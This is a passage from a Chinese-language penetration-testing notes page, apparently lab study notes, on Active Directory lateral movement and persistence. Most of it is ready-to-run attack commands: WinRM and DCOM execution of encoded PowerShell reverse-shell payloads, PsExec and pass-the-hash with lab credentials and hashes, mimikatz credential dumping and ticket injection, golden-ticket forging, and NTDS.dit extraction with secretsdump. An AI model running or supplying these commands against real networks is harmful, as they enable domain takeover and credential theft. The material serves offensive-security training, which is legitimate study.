+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+</code></pre>
+<p>WinRM：远程主机管理（使用5986https和5985http）</p>
+<pre><code class="language-armasm">winrs -r:files04 -u:jen -p:Nexus123!  &quot;cmd /c hostname &amp; whoami&quot;
+
+winrs -r:files04 -u:jen -p:Nexus123!  &quot;powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&quot;
+</code></pre>
+<p>powershell</p>
+<pre><code class="language-armasm">$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+New-PSSession -ComputerName 192.168.50.73 -Credential $credential
+
+成功返回
+session ID 1
+
+进入session可以执行命令
+Enter-PSSession 1
+</code></pre>
+<h3 id="2312-psexec">23.1.2 PsExec</h3>
+<p>条件</p>
+<pre><code class="language-armasm">用户是本地administrators组
+开启ADMIN$
+开启文件和打印共享
+</code></pre>
+<pre><code class="language-armasm">./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+</code></pre>
+<h3 id="2313-hash传递pth">23.1.3 hash传递（pth）</h3>
+<p>条件</p>
+<pre><code class="language-armasm">smb的445端口可访问
+开启ADMIN$
+开启文件和打印共享
+</code></pre>
+<pre><code class="language-armasm">/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+</code></pre>
+<h3 id="2314-hash跨越">23.1.4 hash跨越</h3>
+<p>获得一台机器的用户（本地管理员system权限）后，有与管理员登录的话，使用mimikatz获得其他用户hash（域管理员），就可以使用hash跨越</p>
+<pre><code class="language-armasm">privilege::debug
+sekurlsa::logonpasswords
+</code></pre>
+<p>创建域管权限的进程</p>
+<pre><code class="language-armasm">sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+</code></pre>
+<p>查看票据</p>
+<pre><code class="language-armasm">klist
+没有票据
+net use \\files04
+klist
+有票据了
+执行命令
+.\PsExec.exe \\files04 cmd
+</code></pre>
+<h3 id="2315-票据传递">23.1.5 票据传递</h3>
+<p>场景：当前用户没有权限访问某共享文件夹，使用mimikatz获得另一个具有权限的票据TGS，然后导入就可以访问了</p>
+<pre><code class="language-armasm">whoami
+ls \\web04\backup
+当前用户没权限访问
+
+privilege::debug
+sekurlsa::tickets /export
+dir *.kirbi
+找到另一个账号的票据注入到当前用户session
+kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+
+klist
+查看已经有了dave的票据
+ls \\web04\backup
+可以访问了
+</code></pre>
+<h3 id="2316-dcom分布式组件对象模型">23.1.6 DCOM（分布式组件对象模型）</h3>
+<p>使用135端口</p>
+<p>powershell</p>
+<pre><code class="language-armasm">$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;192.168.50.73&quot;))
+$dcom.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c calc&quot;,&quot;7&quot;)
+tasklist | findstr &quot;calc&quot;
+</code></pre>
+<p>远程运行计算器，换成反弹shell</p>
+<pre><code class="language-armasm">$dcom.Document.ActiveView.ExecuteShellCommand(&quot;powershell&quot;,$null,&quot;powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&quot;,&quot;7&quot;)
+</code></pre>
+<h2 id="232-ad持久化">23.2 AD持久化</h2>
+<h3 id="2321-黄金票据">23.2.1 黄金票据</h3>
+<p>使用krbtgt的hash伪造票据</p>
+<pre><code class="language-armasm">PsExec64.exe \\DC1 cmd.exe
+当前用户没有权限访问DC1
+
+到DC1上获得krbtgt的hash
+privilege::debug
+lsadump::lsa /patch
+获得域SID和krbtgt的hash
+</code></pre>
+<p>在任意机器上先删除错误票据，为指定用户创建黄金票据，开启指定用户的cmd</p>
+<pre><code class="language-armasm">kerberos::purge
+kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+misc::cmd
+</code></pre>
+<p>然后访问DC1，需要使用主机名，使用IP会无法访问</p>
+<pre><code class="language-armasm">PsExec.exe \\dc1 cmd.exe
+whoami /groups
+当前用户属于域管组了
+</code></pre>
+<h3 id="2322-shadow副本">23.2.2 Shadow副本</h3>
+<p>使用域管备份</p>
+<pre><code class="language-armasm">vshadow.exe -nw -p  C:
+
+- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+</code></pre>
+<p>拷贝文件到指定目录</p>
+<pre><code class="language-armasm">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+</code></pre>
+<p>注册表获取system</p>
+<pre><code class="language-armasm">reg.exe save hklm\system c:\system.bak
+</code></pre>
+<p>获得上面两个文件后可以获得所有用户hash</p>
+<pre><code class="language-armasm">impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+</code></pre>
+</p>
+
+     <p class="md_block">
+    <div class="reward"><div class="reward-button">赏 <span class="reward-code"> <span class="alipay-code"> <img class="alipay-img" src="https://10086skynet.top/media/images/alipay.png"><b>支付宝扫码打赏</b> </span> <span class="wechat-code"> <img class="wechat-img" src="https://10086skynet.top/media/images/wechat.png"><b>微信打赏</b> </span> </span></div></div>
+</p> 
+</div>
+
+</div>
+
+
+
+<link href="https://10086skynet.top/styles/main.css" type="text/css" rel="stylesheet"/>
+
+<div class="doc_comments">
+
+</div>
+
+
+
+  </div>
+</div>
+
+
+
+      </div>
+
+
+
+
+    </div>
+
+   <div class="footer">
+<link href="https://10086skynet.top/styles/main.css" type="text/css" rel="stylesheet"/><div class="site_footer_wrap"><div class="site_footer">
+
+      <div class="mysocials"><div class="my_socials">
+		   
+			   
+    
+			   
+    
+			   
+    
+			   
+    
+</div><link href="https://10086skynet.top/styles/main.css" type="text/css" rel="stylesheet"/>
+
+      </div>
+
+      <div class="copyright"><html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+
+ <script type="text/javascript">
+  window.onload=function(){
+   window.requestAnimationFrame(getDate)
+  }
+  function getDate(){
+   window.setTimeout(function(){
+    window.requestAnimationFrame(getDate)
+   },1000/2)
+   var d=new Date();   
+   var year=d.getFullYear()  //获取年
+   var month=d.getMonth()+1;  //获取月，从 Date 对象返回月份 (0 ~ 11)，故在此处+1
+   var day=d.getDay()    //获取日
+   var days=d.getDate() //获取日期
+   var hour=d.getHours()   //获取小时
+   var minute=d.getMinutes()  //获取分钟
+   var second=d.getSeconds()   //获取秒
+				
+   if(month<10) month="0"+month
+   if(days<10) days="0"+days
+   if(hour<10) hour="0"+hour
+   if(minute<10) minute="0"+minute
+   if(second<10) second="0"+second
+				
+   var week=new Array("星期日","星期一","星期二","星期三","星期四","星期五","星期六")
+   var Tools=document.getElementById("showtime")
+   var da=year+ "." +month+ "." +days+ "_" +hour+ ":" +minute+ ":" +second+ "_" +week[day]
+   Tools.innerHTML=da
+  }			
+</script>
+</head>
+<body>
+<div id="showtime"></div>
+</body>
+
+<p><audio autoplay><source src="http://23683.live.streamtheworld.com/UFM_1003AAC.aac" type="audio/mpeg"></audio>
+
+<audio controls="controls"><source src="http://22283.live.streamtheworld.com/UFM_1003AAC.aac" type="audio/mpeg"/></audio>
+
+<p>下载地址：XXX<span style="color: #ffffff;"><a target="_blank" style="color: #ffffff;" href="https://www.baidu.com/default.html">*</a></span></p>
+<p><iframe src="https://ip.skk.moe/simple" style="width: 100%; border: 0"></iframe></p>
+</html>
+      </div>
+
+</div></div>
+
+    </div>
+
+
+<style type="text/css">a.back_to_top {
+    text-decoration: none;
+    position: fixed;
+    bottom: 40px;
+    right: 30px;
+    background: #f0f0f0;
+    height: 40px;
+    width: 40px;
+    border-radius: 50%;
+    line-height: 36px;
+    font-size: 18px;
+    text-align: center;
+    transition-duration: .5s;
+    transition-propety: background-color;
+    display: none;
+}
+
+a.back_to_top span {
+    color: #888;
+}
+
+a.back_to_top:hover {
+    cursor: pointer;
+    background: #dfdfdf;
+}
+
+a.back_to_top:hover span {
+    color: #555;
+}
+
+@media print, screen and (max-width: 580px) {
+    .back_to_top {
+        display: none !important;
+    }
+}
+
+
+
+</style><a id="back_to_top" href="#" class="back_to_top"><span>△</span>
+</a>
+<script type="text/javascript" src="https://10086skynet.top/media/scripts/jquery.js"></script>
+
+<script>$(document).ready((function(_this) {
+  return function() {
+    var bt;
+    bt = $('#back_to_top');
+    if ($(document).width() > 480) {
+      $(window).scroll(function() {
+        var st;
+        st = $(window).scrollTop();
+        if (st > 30) {
+          return bt.css('display', 'block');
+        } else {
+          return bt.css('display', 'none');
+        }
+      });
+      return bt.click(function() {
+        $('body,html').animate({
+          scrollTop: 0
+        }, 800);
+        return false;
+      });
+    }
+  };
+})(this));
+</script>
+
+</body>
+
+</html>
